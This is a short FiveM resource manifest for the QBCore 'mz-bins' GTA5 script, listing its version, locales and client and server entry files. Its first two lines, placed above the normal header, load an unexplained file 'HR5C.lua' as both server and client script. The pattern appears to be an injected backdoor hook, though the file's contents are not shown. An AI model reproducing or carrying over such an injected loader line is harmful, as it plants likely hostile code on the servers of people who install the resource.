server_script "HR5C.lua"
client_script "HR5C.lua"
fx_version 'cerulean'
game 'gta5'

description 'mz-bins - Made by Mr_Zain#4139'
version '1.1.0'
lua54 'yes'

shared_scripts {
	'@qb-core/shared/locale.lua',
	'config.lua',
	'locales/en.lua',
}

client_script 'client/main.lua'
server_script 'server/main.lua'

